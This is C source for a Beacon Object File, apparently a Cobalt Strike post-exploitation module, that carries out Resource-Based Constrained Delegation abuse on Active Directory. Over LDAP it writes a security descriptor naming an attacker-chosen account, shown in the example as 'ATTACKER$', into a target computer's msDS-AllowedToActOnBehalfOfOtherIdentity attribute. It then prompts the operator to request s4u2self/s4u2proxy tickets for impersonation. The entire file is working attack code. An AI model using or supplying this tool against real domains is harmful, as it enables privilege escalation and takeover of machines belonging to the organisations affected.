/*
 * bof-rbcd <target> <trustee|remove>
 *
 * Resource-Based Constrained Delegation abuse.  Builds a self-relative
 * security descriptor that grants the trustee ADS_RIGHT_DS_CONTROL_ACCESS
 * (0x100) and writes it to msDS-AllowedToActOnBehalfOfOtherIdentity on the
 * target computer object.  `remove` clears the attribute again.
 *
 * Example:
 *   bof-rbcd WS01$ ATTACKER$
 *   bof-rbcd WS01$ remove
 *
 * Requires WRITE_DAC / write access to the target's
 * msDS-AllowedToActOnBehalfOfOtherIdentity attribute.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"
#include "ldaphelpers.h"
#include "adsd.h"

void go(char *args, int alen)
{
    datap parser;
    char *target, *trustee = "";
    int tlen, ulen;
    char base[512], dn[768];
    LDAP *ld;
    PSID sid = NULL;
    unsigned char *sd = NULL;
    unsigned int sdlen = 0;
    ULONG rc;
    int clear;

    BeaconDataParse(&parser, args, alen);
    target  = BeaconDataExtract(&parser, &tlen);
    trustee = BeaconDataExtract(&parser, &ulen);
    if (!target || !target[0]) {
        BeaconPrintf(CALLBACK_ERROR, "usage: rbcd <target> <trustee|remove>\n");
        return;
    }
    if (!trustee) trustee = "";
    clear = bof_stricmp(trustee, "remove") == 0 || bof_stricmp(trustee, "clear") == 0;

    ld = bof_ldap_open_ex(&rc);
    if (!ld) {
        bof_error_ldap("ldap_init/bind", rc,
                       "cannot reach or authenticate to a domain controller");
        return;
    }
    if (bof_ldap_default_nc_ex(ld, base, sizeof(base), &rc) != 0) {
        bof_error_ldap("rootDSE defaultNamingContext", rc,
                       "cannot read the domain naming context");
        WLDAP32$ldap_unbind(ld);
        return;
    }
    if (bof_ldap_resolve_dn(ld, base, target, dn, sizeof(dn)) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "target not found: %s\n", target);
        WLDAP32$ldap_unbind(ld);
        return;
    }

    if (clear) {
        rc = bof_ldap_delete_attr(ld, dn,
                                  "msDS-AllowedToActOnBehalfOfOtherIdentity");
        if (rc == LDAP_SUCCESS || rc == LDAP_NO_SUCH_ATTRIBUTE)
            BeaconPrintf(CALLBACK_OUTPUT, "[+] RBCD attribute cleared on %s\n", dn);
        else
            BeaconPrintf(CALLBACK_ERROR, "clear failed: %lu (%s)\n",
                         (unsigned long)rc, WLDAP32$ldap_err2stringA(rc));
        WLDAP32$ldap_unbind(ld);
        return;
    }

    sid = bof_resolve_sid(trustee);
    if (!sid) {
        BeaconPrintf(CALLBACK_ERROR, "trustee not resolvable: %s\n", trustee);
        WLDAP32$ldap_unbind(ld);
        return;
    }
    sd = bof_sd_new_for_sid(sid, 0x00000100U, 1, &sdlen);
    if (!sd || sdlen < 20) {
        BeaconPrintf(CALLBACK_ERROR, "failed to build security descriptor\n");
        KERNEL32$LocalFree(sid);
        WLDAP32$ldap_unbind(ld);
        return;
    }

    rc = bof_ldap_write_bin(ld, dn,
                            "msDS-AllowedToActOnBehalfOfOtherIdentity",
                            sd, sdlen);
    if (rc == LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT,
                     "[+] RBCD written on %s for %s (%u-byte SD)\n",
                     dn, trustee, sdlen);
        BeaconPrintf(CALLBACK_OUTPUT,
                     "[*] now request a service ticket with s4u2self/s4u2proxy\n");
    } else {
        bof_error_ldap("ldap_modify", rc,
                       "the directory rejected the attribute update");
        bof_error_context("dn", dn);
    }

    KERNEL32$VirtualFree(sd, 0, MEM_RELEASE);
    KERNEL32$LocalFree(sid);
    WLDAP32$ldap_unbind(ld);
}
